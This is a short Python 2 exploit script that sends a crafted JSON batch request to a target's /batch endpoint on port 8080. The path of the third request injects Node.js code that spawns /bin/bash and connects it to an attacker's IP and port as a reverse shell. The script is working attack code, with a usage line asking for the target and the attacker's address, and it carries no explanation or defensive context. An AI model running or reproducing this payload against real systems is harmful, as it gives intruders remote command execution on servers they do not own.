import requests,sys 

if len(sys.argv) != 4: 
 print "(+) usage: %s <target> <attacking ip address> <attacking port>" % sys.argv[0] 
 sys.exit(-1) 

target = "http://%s:8080/batch" % sys.argv[1] 
cmd = "//bin//bash" 
attackerip = sys.argv[2] 
attackerport = sys.argv[3] 
request_1 = '{"method":"get","path":"/profile"}' 
request_2 = '{"method":"get","path":"/item"}' 
shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % cmd 
shell += 'var client = new net.Socket(); ' 
shell += 'client.connect(%s, \'%s\', function() 
{client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attackerport, attackerip) 
shell += 'sh.stderr.pipe(client);});' 
request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % shell 
json = '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3) 
r = requests.post(target, json) 
print r.content 

 
